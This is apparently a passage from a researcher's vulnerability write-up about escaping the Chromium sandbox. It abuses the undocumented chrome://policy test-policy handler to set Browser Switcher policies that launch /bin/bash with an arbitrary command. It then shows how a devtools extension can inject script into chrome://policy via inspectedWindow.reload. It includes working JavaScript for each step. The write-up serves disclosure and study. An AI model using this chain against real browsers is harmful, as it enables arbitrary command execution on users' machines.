<p>Additionally, Chromium has a few webpages that it uses for displaying its GUI, using a mechanism called <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/webui_explainer.md">WebUI</a>. These are prefixed with the <code>chrome://</code> URL protocol, and include ones you've probably used like <code>chrome://settings</code> and <code>chrome://history</code>. Their purpose is to provide the user-facing UI for Chromium's features, while being written with web technologies such as HTML, CSS, and Javascript. Because they need to display and modify information that is specific to the internals of the browser, they are considered to be privileged, which means they have access to private APIs that are used nowhere else. These private APIs allow the Javascript code running on the WebUI frontend to communicate with native C++ code in the browser itself.</p>
<p>Preventing an attacker from accessing WebUIs is important because code that runs on a WebUI page can bypass the Chromium sandbox entirely. For example, on <code>chrome://downloads</code>, clicking on a download for a <code>.exe</code> file will run the executable, and thus if this action was performed via a malicious script, that script can escape the sandbox.</p>
<p>Running untrusted Javascript on <code>chrome://</code> pages is a common attack vector, so the receiving end of these private APIs perform some validation to ensure that they're not doing anything that the user couldn't otherwise do normally. Going back to the <code>chrome://downloads</code> example, Chromium protects against that exact scenario by requiring that to open a file from the downloads page, the action that triggers it has to come from an actual user input and not just Javascript.</p>
<p>Of course, sometimes with these checks there's an edge case that the Chromium developers didn't account for.</p>
<h2>About Enterprise Policies</h2>
<p>My journey towards finding this vulnerability began when I was looking into the Chromium <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/enterprise/policies.md">enterprise policy system</a>. It's intended to be a way for administrators to force certain settings to be applied to devices owned by a company or school. Usually, policies tied to a Google account and are downloaded from Google's own management server. </p>
<p><img alt="The &quot;Your browser is managed by your organization&quot; message." src="https://ading.dev/blog/assets/chrome_sandbox_escape/browser_management_msg.png"></p>
<p>Enterprise policies also include things that the user would not be able to modify normally. For example, one of the things you can do with policies is disable the dino easter egg game:</p>
<p><img alt="alt text" src="https://ading.dev/blog/assets/chrome_sandbox_escape/dino_policy.png"></p>
<p>Moreover, the policies themselves are separated into two categories: user policies and device policies. </p>
<p>Device policies are used to manage settings across an entire Chrome OS device. They can be as simple as restricting which accounts can log in or setting the release channel. Some of them can even change the behavior of the device's firmware (used to prevent developer mode or downgrading the OS). However, because this vulnerability doesn't pertain to Chrome OS, device policies can be ignored for now. </p>
<p>User policies are applied to a specific user or browser instance. Unlike device policies, these are available on all platforms, and they can be set locally rather than relying on Google's servers. On Linux for instance, <a href="https://support.google.com/chrome/a/answer/9027408">placing a JSON file</a> inside <code>/etc/opt/chrome/policies</code> will set the user policies for all instances of Google Chrome on the device. </p>
<p>Setting user policies using this method is somewhat inconvenient since writing to the policies directory requires root permissions. However, what if there was a way to modify these policies without creating a file? </p>
<h2>The Policies WebUI</h2>
<p>Notably, Chromium has a WebUI for viewing the policies applied to the current device, located at <code>chrome://policy</code>. It shows the list of policies applied, the logs for the policy service, and the ability to export these policies to a JSON file.</p>
<p><img alt="A screenshot of the chrome://policy page" src="https://ading.dev/blog/assets/chrome_sandbox_escape/chrome_policy_page.png"></p>
<p>This is nice and all, but normally there's no way to edit the policies from this page. Unless of course, there is an undocumented feature to do exactly that. </p>
<h2>Abusing the Policy Test Page</h2>
<p>When I was doing research on the subject, I came across the following entry in the <a href="https://support.google.com/chrome/a/answer/10314655#117">Chrome Enterprise release notes</a> for Chrome v117:</p>
<blockquote>
<p><strong>Chrome will introduce a chrome://policy/test page</strong><br>
chrome://policy/test will allow customers to test out policies on the Beta, Dev, Canary channels. If there is enough customer demand, we will consider bringing this functionality to the Stable channel. </p>
</blockquote>
<p>As it turns out, this is the only place in Chromium's documentation where this feature is mentioned at all. So with nowhere else to look, I examined the Chromium source code to figure out how it is supposed to work. </p>
<p>Using <a href="https://source.chromium.org/">Chromium Code Search</a>, I did a <a href="https://source.chromium.org/search?q=chrome:%2F%2Fpolicy%2Ftest&amp;sq=">search for <code>chrome://policy/test</code></a>, which led me to the <a href="https://source.chromium.org/chromiumos/_/chromium/chromium/src/components/policy/+/9e42c767311886dbe08c897be952b8efcfae8991:resources/webui/test/policy_test.ts;bpv=1;bpt=0;drc=41b2dd136f67dfbfbe5c73cc5dab1699709f340e">JS part of the WebUI code</a> for the policy test page. I then noticed the <a href="https://source.chromium.org/chromiumos/_/chromium/chromium/src/components/policy/+/9e42c767311886dbe08c897be952b8efcfae8991:resources/webui/test/policy_test_browser_proxy.ts;bpv=1;bpt=0;drc=0a8c7cff04f5555fb31f50742662fd398ee7febe">private API calls</a> that it uses to set the test policies:</p>
<div><pre><span></span><code><span>export</span><span> </span><span>class</span><span> PolicyTestBrowserProxy </span><span>{</span>
<span>  applyTestPolicies</span><span>(</span><span>policies</span><span>:</span><span> </span><span>string</span><span>,</span><span> profileSeparationResponse</span><span>:</span><span> </span><span>string</span><span>)</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> sendWithPromise</span><span>(</span><span>'setLocalTestPolicies'</span><span>,</span><span> policies</span><span>,</span><span> profileSeparationResponse</span><span>);</span>
<span>  </span><span>}</span>
<span>  </span><span>...</span>
<span>}</span>
</code></pre></div>

<p>Remember how I said that these WebUI pages have access to private APIs? Well, <code>sendWithPromise()</code> is one of these. <code>sendWithPromise()</code> is really just a wrapper for <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/webui_explainer.md#chrome_send"><code>chrome.send()</code></a>, which sends a request to a handler function written in C++. The handler function can then do whatever it needs to in the internals of the browser, then it may return a value which is passed back to the JS side by <code>sendWithPromise()</code>. </p>
<p>And so, on a whim, I decided to see what calling this in the JS console would do.</p>
<div><pre><span></span><code><span>//import cr.js since we need sendWithPromise</span>
<span>let</span><span> cr </span><span>=</span><span> </span><span>await</span><span> </span><span>import</span><span>(</span><span>'chrome://resources/js/cr.js'</span><span>);</span>
<span>await</span><span> cr</span><span>.</span><span>sendWithPromise</span><span>(</span><span>"setLocalTestPolicies"</span><span>,</span><span> </span><span>""</span><span>,</span><span> </span><span>""</span><span>);</span>
</code></pre></div>

<p>Unfortunately, running it simply crashed the browser. Interestingly, the following line appeared in the crash log:
<code>[17282:17282:1016/022258.064657:FATAL:local_test_policy_loader.cc(68)] Check failed: policies.has_value() &amp;&amp; policies-&gt;is_list(). List of policies expected</code></p>
<p>It looks like it expects a JSON string with an array of policies as the first argument, which makes sense. Let's provide one then. Luckily <code>policy_test_browser_proxy.ts</code> tells me the format it expects so I don't have to do too much guesswork.</p>
<div><pre><span></span><code><span>let</span><span> cr </span><span>=</span><span> </span><span>await</span><span> </span><span>import</span><span>(</span><span>'chrome://resources/js/cr.js'</span><span>);</span>
<span>let</span><span> policy </span><span>=</span><span> </span><span>JSON</span><span>.</span><span>stringify</span><span>([</span>
<span>  </span><span>{</span><span> </span>
<span>    name</span><span>:</span><span> </span><span>"AllowDinosaurEasterEgg"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>false,</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span><span> </span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>}</span>
<span>]);</span>
<span>await</span><span> cr</span><span>.</span><span>sendWithPromise</span><span>(</span><span>"setLocalTestPolicies"</span><span>,</span><span> policy</span><span>,</span><span> </span><span>""</span><span>);</span>
</code></pre></div>

<video controls="">
  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/test_policy_bug.mp4" type="video/mp4">
  <p>Video info: A demonstration of the policy test page bug.</p>
</video>

<p>So after running this... it just works? I just set an arbitrary user policy by simply running some Javascript on <code>chrome://policy</code>. Clearly something is going wrong here, considering that I never explicitly enabled this feature at all.</p>
<h2>Broken WebUI Validation</h2>
<p>For some context, this is what the policy test page is supposed to look like when it's properly enabled. </p>
<p><img alt="A screenshot of the policy test page." src="https://ading.dev/blog/assets/chrome_sandbox_escape/policy_test_page.png"></p>
<p>To properly enable this page, you have to set the <code>PolicyTestPageEnabled</code> policy (also not documented anywhere). If that policy is not set to begin with, then <code>chrome://policy/test</code> just redirects back to <code>chrome://policy</code>.</p>
<p><img alt="A screenshot of the PolicyTestPageEnabled policy." src="https://ading.dev/blog/assets/chrome_sandbox_escape/test_page_policy.png"></p>
<p>So why was I able to set the test policies regardless of the fact that I had the <code>PolicyTestPageEnabled</code> policy disabled? To investigate this, I looked though Chromium Code Search again and found the <a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/webui/policy/policy_ui_handler.cc;l=318-345;drc=ee91a67071b984d80acd62ba9c015577e6c26309;bpv=0;bpt=0">WebUI handler</a> for the <code>setLocalTestPolicies</code> function on the C++ side.</p>
<div><pre><span></span><code><span>void</span><span> </span><span>PolicyUIHandler::HandleSetLocalTestPolicies</span><span>(</span>
<span>    </span><span>const</span><span> base</span><span>::</span><span>Value</span><span>::</span><span>List</span><span>&amp;</span><span> args</span><span>)</span><span> </span><span>{</span>
<span>  std</span><span>::</span><span>string policies </span><span>=</span><span> args</span><span>[</span><span>1</span><span>].</span><span>GetString</span><span>();</span>

<span>  policy</span><span>::</span><span>LocalTestPolicyProvider</span><span>*</span><span> local_test_provider </span><span>=</span>
<span>      </span><span>static_cast</span><span>&lt;</span><span>policy</span><span>::</span><span>LocalTestPolicyProvider</span><span>*&gt;(</span>
<span>          g_browser_process</span><span>-&gt;</span><span>browser_policy_connector</span><span>()</span>
<span>              </span><span>-&gt;</span><span>local_test_policy_provider</span><span>());</span>

<span>  CHECK</span><span>(</span><span>local_test_provider</span><span>);</span>

<span>  Profile</span><span>::</span><span>FromWebUI</span><span>(</span><span>web_ui</span><span>())</span>
<span>      </span><span>-&gt;</span><span>GetProfilePolicyConnector</span><span>()</span>
<span>      </span><span>-&gt;</span><span>UseLocalTestPolicyProvider</span><span>();</span>

<span>  local_test_provider</span><span>-&gt;</span><span>LoadJsonPolicies</span><span>(</span><span>policies</span><span>);</span>
<span>  AllowJavascript</span><span>();</span>
<span>  ResolveJavascriptCallback</span><span>(</span><span>args</span><span>[</span><span>0</span><span>],</span><span> </span><span>true</span><span>);</span>
<span>}</span>
</code></pre></div>

<p>The only validation that this function performs is that it checks to see if <code>local_test_provider</code> exists, otherwise it crashes the entire browser. Under what conditions will <code>local_test_provider</code> exist, though? </p>
<p>To answer that, I found the code that actually <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/policy/core/common/local_test_policy_provider.cc;l=23;drc=0fba000db58b7966ef2b2e9202dabba44f13d62a;bpv=1;bpt=0">creates the local test policy provider</a>. </p>
<div><pre><span></span><code><span>std</span><span>::</span><span>unique_ptr</span><span>&lt;</span><span>LocalTestPolicyProvider</span><span>&gt;</span>
<span>LocalTestPolicyProvider</span><span>::</span><span>CreateIfAllowed</span><span>(</span><span>version_info</span><span>::</span><span>Channel channel</span><span>)</span><span> </span><span>{</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>utils</span><span>::</span><span>IsPolicyTestingEnabled</span><span>(</span><span>/*pref_service=*/</span><span>nullptr</span><span>,</span><span> channel</span><span>))</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> base</span><span>::</span><span>WrapUnique</span><span>(</span><span>new</span><span> LocalTestPolicyProvider</span><span>());</span>
<span>  </span><span>}</span>

<span>  </span><span>return</span><span> </span><span>nullptr</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>So this function actually does perform a check to see if the test policies are allowed. If they're not allowed, then it returns null, and attempting to set test policies like I showed earlier will cause a crash.</p>
<p>Maybe <a href="https://source.chromium.org/chromium/chromium/src/+/main:components/policy/core/common/policy_utils.cc;drc=0fba000db58b7966ef2b2e9202dabba44f13d62a;bpv=1;bpt=0;l=13"><code>IsPolicyTestingEnabled()</code></a> is misbehaving? Here's what the function looks like:</p>
<div><pre><span></span><code><span>bool</span><span> </span><span>IsPolicyTestingEnabled</span><span>(</span><span>PrefService</span><span>*</span><span> pref_service</span><span>,</span>
<span>                            version_info</span><span>::</span><span>Channel channel</span><span>)</span><span> </span><span>{</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>pref_service </span><span>&amp;&amp;</span>
<span>      </span><span>!</span><span>pref_service</span><span>-&gt;</span><span>GetBoolean</span><span>(</span><span>policy_prefs</span><span>::</span><span>kPolicyTestPageEnabled</span><span>))</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> </span><span>false</span><span>;</span>
<span>  </span><span>}</span>

<span>  </span><span>if</span><span> </span><span>(</span><span>channel </span><span>==</span><span> version_info</span><span>::</span><span>Channel</span><span>::</span><span>CANARY </span><span>||</span>
<span>      channel </span><span>==</span><span> version_info</span><span>::</span><span>Channel</span><span>::</span><span>DEFAULT</span><span>)</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> </span><span>true</span><span>;</span>
<span>  </span><span>}</span>

<span>  </span><span>return</span><span> </span><span>false</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>This function first checks if <code>kPolicyTestPageEnabled</code> is true, which is the the policy that is supposed to enable the policy test page under normal conditions. However, you may notice that when <code>IsPolicyTestingEnabled()</code> is called, the first argument, the <code>pref_service</code>, is set to null. This causes the check to be ignored entirely.</p>
<p>Now, the only check that remains is for the <code>channel</code>. In this context, "channel" means browser's release channel, which is something like stable, beta, dev, or canary. So in this case, only <code>Channel::CANARY</code> and <code>Channel::DEFAULT</code> is allowed. That must mean that my browser is set to either the <code>Channel::CANARY</code> or <code>Channel::DEFAULT</code>. </p>
<p>Then does the browser <a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/common/channel_info_posix.cc;l=29-56;drc=d5cc0de2d29206d08ae4ef0980dfe049cc0344d5;bpv=0;bpt=0">know what channel it's in</a>? Here's the function where it determines that:</p>
<div><pre><span></span><code><span>// Returns the channel state for the browser based on branding and the</span>
<span>// CHROME_VERSION_EXTRA environment variable. In unbranded (Chromium) builds,</span>
<span>// this function unconditionally returns `channel` = UNKNOWN and</span>
<span>// `is_extended_stable` = false. In branded (Google Chrome) builds, this</span>
<span>// function returns `channel` = UNKNOWN and `is_extended_stable` = false for any</span>
<span>// unexpected $CHROME_VERSION_EXTRA value.</span>
<span>ChannelState </span><span>GetChannelImpl</span><span>()</span><span> </span><span>{</span>
<span>#if BUILDFLAG(GOOGLE_CHROME_BRANDING)</span>
<span>  </span><span>const</span><span> </span><span>char</span><span>*</span><span> </span><span>const</span><span> env </span><span>=</span><span> getenv</span><span>(</span><span>"CHROME_VERSION_EXTRA"</span><span>);</span>
<span>  </span><span>const</span><span> std</span><span>::</span><span>string_view env_str </span><span>=</span>
<span>      env </span><span>?</span><span> std</span><span>::</span><span>string_view</span><span>(</span><span>env</span><span>)</span><span> </span><span>:</span><span> std</span><span>::</span><span>string_view</span><span>();</span>

<span>  </span><span>// Ordered by decreasing expected population size.</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"stable"</span><span>)</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>STABLE</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"extended"</span><span>)</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>STABLE</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>true</span><span>};</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"beta"</span><span>)</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>BETA</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"unstable"</span><span>)</span><span>  </span><span>// linux version of "dev"</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>DEV</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>env_str </span><span>==</span><span> </span><span>"canary"</span><span>)</span><span> </span><span>{</span>
<span>    </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>CANARY</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>  </span><span>}</span>
<span>#endif  // BUILDFLAG(GOOGLE_CHROME_BRANDING)</span>

<span>  </span><span>return</span><span> </span><span>{</span><span>version_info</span><span>::</span><span>Channel</span><span>::</span><span>UNKNOWN</span><span>,</span><span> </span><span>/*is_extended_stable=*/</span><span>false</span><span>};</span>
<span>}</span>
</code></pre></div>

<p>If you don't know how the C preprocessor works, the <code>#if BUILDFLAG(GOOGLE_CHROME_BRANDING)</code> part means that the enclosed code will only be compiled if <code>BUILDFLAG(GOOGLE_CHROME_BRANDING)</code> is true. Otherwise that part of the code doesn't exist. Considering that I'm using plain Chromium and not the branded Google Chrome, the channel will always be <code>Channel::UNKNOWN</code>. This also means that, unfortunately, the bug will not work on stable builds of Google Chrome since the release channel is set to the proper value there.</p>
<div><pre><span></span><code><span>enum</span><span> </span><span>class</span><span> </span><span>Channel</span><span> </span><span>{</span>
<span>  UNKNOWN </span><span>=</span><span> </span><span>0</span><span>,</span>
<span>  DEFAULT </span><span>=</span><span> UNKNOWN</span><span>,</span>
<span>  CANARY </span><span>=</span><span> </span><span>1</span><span>,</span>
<span>  DEV </span><span>=</span><span> </span><span>2</span><span>,</span>
<span>  BETA </span><span>=</span><span> </span><span>3</span><span>,</span>
<span>  STABLE </span><span>=</span><span> </span><span>4</span><span>,</span>
<span>};</span>
</code></pre></div>

<p>Looking at the enum definition for the channels, we can see that <code>Channel::UNKNOWN</code> is actually the same as <code>Channel::DEFAULT</code>. Thus, on Chromium and its derivatives, the release channel check in <code>IsPolicyTestingEnabled()</code> always passes, and the function will always return true. </p>
<h2>Sandbox Escape via the Browser Switcher</h2>
<p>So what can I actually do with the ability to set arbitrary user policies? To answer that, I looked at the <a href="https://chromeenterprise.google/policies/">Chrome enterprise policy list</a>. </p>
<p>One of the features present in enterprise policies is the <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/chrome/browser/browser_switcher/README.md">Legacy Browser Support</a> module, also called the Browser Switcher. It's designed to accommodate Internet Explorer users by launching an alternative browser when the user visit certain URLs in Chromium. The behaviors of this feature are all controllable with policies. </p>
<p>The <a href="https://chromeenterprise.google/policies/#AlternativeBrowserPath"><code>AlternativeBrowserPath</code></a> policy stood out in particular. Combined with <a href="https://chromeenterprise.google/policies/#AlternativeBrowserParameters"><code>AlternativeBrowserParameters</code></a>, this lets Chromium launch <em>any shell command</em> as the "alternate browser." However, keep in mind this only works on Linux, MacOS, and Windows, because otherwise the browser switcher policies don't exist.</p>
<p>We can set the following policies to make Chromium launch the calculator, for instance:</p>
<div><pre><span></span><code><span>name</span><span>:</span><span> </span><span>"BrowserSwitcherEnabled"</span>
<span>value</span><span>:</span><span> </span><span>true</span>

<span>name</span><span>:</span><span> </span><span>"BrowserSwitcherUrlList"</span>
<span>value</span><span>:</span><span> </span><span>[</span><span>"example.com"</span><span>]</span>

<span>name</span><span>:</span><span> </span><span>"AlternativeBrowserPath"</span>
<span>value</span><span>:</span><span> </span><span>"/bin/bash"</span>

<span>name</span><span>:</span><span> </span><span>"AlternativeBrowserParameters"</span>
<span>value</span><span>:</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"xcalc</span><span> </span><span>#</span><span> </span><span>${url}"</span><span>]</span><span> </span>
</code></pre></div>

<p>Whenever the browser tries to navigate to <code>example.com</code>, the browser switcher will kick in and launch <code>/bin/bash</code>. <code>["-c", "xcalc # https://example.com"]</code> get passed in as arguments. The <code>-c</code> tells bash to run the command specified in the next argument. You may have noticed that the page URL gets substituted into <code>${url}</code>, and so to prevent this from messing up the command, we can simply put it behind a <code>#</code> which makes it a comment. And thus, we are able to trick Chromium into running <code>/bin/bash -c 'xcalc # https://example.com'</code>.</p>
<p>Utilizing this from the <code>chrome://policy</code> page is rather simple. I can just set these policies using the aforementioned method, and then call <code>window.open("https://example.com")</code> to trigger the browser switcher.</p>
<div><pre><span></span><code><span>let</span><span> cr </span><span>=</span><span> </span><span>await</span><span> </span><span>import</span><span>(</span><span>'chrome://resources/js/cr.js'</span><span>);</span>
<span>let</span><span> policy </span><span>=</span><span> </span><span>JSON</span><span>.</span><span>stringify</span><span>([</span>
<span>  </span><span>{</span><span> </span><span>//enable the browser switcher feature</span>
<span>    name</span><span>:</span><span> </span><span>"BrowserSwitcherEnabled"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>true,</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>},</span><span> </span>
<span>  </span><span>{</span><span> </span><span>//set the browser switcher to trigger on example.com</span>
<span>    name</span><span>:</span><span> </span><span>"BrowserSwitcherUrlList"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>[</span><span>"example.com"</span><span>],</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>},</span><span> </span>
<span>  </span><span>{</span><span> </span><span>//set the executable path to launch</span>
<span>    name</span><span>:</span><span> </span><span>"AlternativeBrowserPath"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>"/bin/bash"</span><span>,</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>},</span><span> </span>
<span>  </span><span>{</span><span> </span><span>//set the arguments for the executable</span>
<span>    name</span><span>:</span><span> </span><span>"AlternativeBrowserParameters"</span><span>,</span>
<span>    value</span><span>:</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"xcalc # https://example.com"</span><span>],</span>
<span>    level</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    source</span><span>:</span><span> </span><span>1</span><span>,</span>
<span>    scope</span><span>:</span><span> </span><span>1</span>
<span>  </span><span>}</span>
<span>]);</span>

<span>//set the policies listed above</span>
<span>await</span><span> cr</span><span>.</span><span>sendWithPromise</span><span>(</span><span>"setLocalTestPolicies"</span><span>,</span><span> policy</span><span>,</span><span> </span><span>""</span><span>);</span>
<span>//navigate to example.com, which will trigger the browser switcher</span>
<span>window</span><span>.</span><span>open</span><span>(</span><span>"https://example.com"</span><span>)</span>
</code></pre></div>

<video controls="">
  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/policy_browser_switcher.mp4" type="video/mp4">
  <p>Video info: A demonstration of using the test policies bug and the browser switcher to perform a sandbox escape.</p>
</video>

<p>And that right there is the sandbox escape. We have managed to run an arbitrary shell command via Javascript running on <code>chrome://policy</code>.</p>
<h2>Breaking the Devtools API</h2>
<p>You might have noticed that so far, this attack requires the victim to paste the malicious code into the browser console while they are on <code>chrome://policy</code>. Actually convincing someone to do this would be rather difficult, making the bug useless. So now, my new goal is to somehow run this JS in <code>chrome://policy</code> automatically. </p>
<p>The most likely way this can be done is by creating a malicious Chrome extension. The Chrome extension APIs have a fairly large attack surface, and extensions by their very nature have the ability to inject JS onto pages. However, like I mentioned earlier, extensions are not allowed to run JS on privileged WebUI pages, so I needed to find a way around that.</p>
<p>There are 4 main ways that an extension can execute JS on pages: </p>
<ul>
<li><a href="https://developer.chrome.com/docs/extensions/reference/api/scripting"><code>chrome.scripting</code></a>, which directly executes JS in a specific tab.</li>
<li><a href="https://developer.chrome.com/docs/extensions/mv2/reference/tabs"><code>chrome.tabs</code></a> in Manifest v2, which works similarly to how <code>chrome.scripting</code> does.</li>
<li><a href="https://developer.chrome.com/docs/extensions/reference/api/debugger"><code>chrome.debugger</code></a> which utilizes the remote debugging protocol.</li>
<li><a href="https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow"><code>chrome.devtools.inspectedWindow</code></a>, which interacts with the inspected page when devtools is open. </li>
</ul>
<p>While investigating this, I decided to look into <code>chrome.devtools.inspectedWindow</code>, as I felt that it was the most obscure and thus least hardened. That assumption turned out to be right.</p>
<p>The way that the <code>chrome.devtools</code> APIs work is that all extensions that use the APIs must have the <a href="https://developer.chrome.com/docs/extensions/how-to/devtools/extend-devtools"><code>devtools_page</code> field</a> in their manifest. For example:</p>
<div><pre><span></span><code><span>{</span>
<span>  </span><span>"name"</span><span>:</span><span> </span><span>"example extension"</span><span>,</span>
<span>  </span><span>"version"</span><span>:</span><span> </span><span>"1.0"</span><span>,</span>
<span>  </span><span>"devtools_page"</span><span>:</span><span> </span><span>"devtools.html"</span><span>,</span>
<span>  </span><span>...</span>
<span>}</span>
</code></pre></div>

<p>Essentially, what this does is it specifies that whenever the user opens devtools, the devtools page loads <code>devtools.html</code> as an iframe. Within that iframe, the extension can use all of the <code>chrome.devtools</code> APIs. You can refer to the <a href="https://developer.chrome.com/docs/extensions/how-to/devtools/extend-devtools">API documentation</a> for the specifics. </p>
<p>While researching the <code>chrome.devtools.inspectedWindow</code> APIs, I noticed a <a href="https://issues.chromium.org/issues/40053357">prior bug report by David Erceg</a>, which involved a bug with <code>chrome.devtools.inspectedWindow.eval()</code>. He managed to get code execution on a WebUI by opening devtools on a normal page, then running <code>chrome.devtools.inspectedWindow.eval()</code> with a script that crashed the page. Then, this crashed tab could be navigated to a WebUI page, where the eval request would be re-run, thus gaining code execution there.</p>
<p>Notably, the <code>chrome.devtools</code> APIs are supposed to protect against this sort of privilege execution by simply disabling their usage after the inspected page has been navigated to a WebUI. As David Erceg demonstrated in his bug report, the key to bypassing this is to send the request for the eval before Chrome decides to disable the devtools API, and to make sure the request arrives at the WebUI page. </p>
<p>After reading that report, I wondered if something similar was possible with <a href="https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow"><code>chrome.devtools.inspectedWindow.reload()</code></a>. This function is also able to run JS on the inspected page, as long as the <code>injectedScript</code> is passed into it.</p>
<p>The first sign that it was exploitable appeared when I tried calling <code>inspectedWindow.reload()</code> when the inspected page was an <code>about:blank</code> page which belonged to a WebUI. <code>about:blank</code> pages are unique in this regard since even though the URL is not special, they inherit the permissions and origin from the page that opened them. Because an <code>about:blank</code> page opened from a WebUI is privileged, you would expect that trying to evaluate JS on that page would be blocked.</p>
<p><img alt="A demo of using inspectedWindow.reload() on an about:blank page." src="https://ading.dev/blog/assets/chrome_sandbox_escape/inspectedwindow_on_blank.png"></p>
<p>Surprisingly, this actually worked. Notice that the title of the alert has the page's origin in it, which is <code>chrome://settings</code>, so the page is in fact privileged. But wait, isn't the devtools API supposed to prevent this exact thing by disabling the API entirely? Well, it doesn't consider the edge case of <code>about:blank</code> pages. Here's the code that handles disabling the API:</p>
<div><pre><span></span><code><span>private</span><span> inspectedURLChanged</span><span>(</span><span>event</span><span>:</span><span> </span><span>Common.EventTarget.EventTargetEvent</span><span>&lt;</span><span>SDK</span><span>.</span><span>Target</span><span>.</span><span>Target</span><span>&gt;):</span><span> </span><span>void</span><span> </span><span>{</span>
<span>  </span><span>if</span><span> </span><span>(!</span><span>ExtensionServer</span><span>.</span><span>canInspectURL</span><span>(</span><span>event</span><span>.</span><span>data</span><span>.</span><span>inspectedURL</span><span>()))</span><span> </span><span>{</span>
<span>    </span><span>this</span><span>.</span><span>disableExtensions</span><span>();</span>
<span>    </span><span>return</span><span>;</span>
<span>  </span><span>}</span>
<span>  </span><span>...</span>
<span>}</span>
</code></pre></div>

<p>Importantly, it only takes the URL into consideration here, not the page's origin. As I demonstrated earlier, these can be two distinct things. Even if the URL is benign, the origin may not be.</p>
<p>Abusing <code>about:blank</code> is nice and all but it's not very useful in the context of making an exploit chain. The page I want to get code execution on, <code>chrome://policy</code>, never opens any <code>about:blank</code> popups, so that's already a dead end. However, I noticed the fact that even though <code>inspectedWindow.eval()</code> failed, <code>inspectedWindow.reload()</code> still ran successfully and executed the JS on <code>chrome://settings</code>. This suggested that <code>inspectedWindow.eval()</code> has its own checks to see if the origin of the inspected page is allowed, while <code>inspectedWindow.reload()</code> has no checks of its own. </p>
<p>Then I wondered if I could just spam the <code>inspectedWindow.reload()</code> calls, so that if at least one of those requests landed on the WebUI page, I would get code execution. </p>
<div><pre><span></span><code><span>function</span><span> inject_script</span><span>()</span><span> </span><span>{</span>
<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
<span>    //check the origin, this script won't do anything on a non chrome page</span>
<span>    if (!origin.startsWith("chrome://")) return;</span>
<span>    alert("hello from chrome.devtools.inspectedWindow.reload");</span>
<span>    `</span>
<span>  </span><span>});</span>
<span>}</span>

<span>setInterval</span><span>(()</span><span> </span><span>=&gt;</span><span> </span><span>{</span>
<span>  </span><span>for</span><span> </span><span>(</span><span>let</span><span> i</span><span>=</span><span>0</span><span>;</span><span> i</span><span>&lt;</span><span>5</span><span>;</span><span> i</span><span>++)</span><span> </span><span>{</span>
<span>    inject_script</span><span>();</span><span> </span>
<span>  </span><span>}</span>
<span>},</span><span> </span><span>0</span><span>);</span><span>  </span>

<span>chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>tabId</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"chrome://policy"</span><span>});</span>
</code></pre></div>

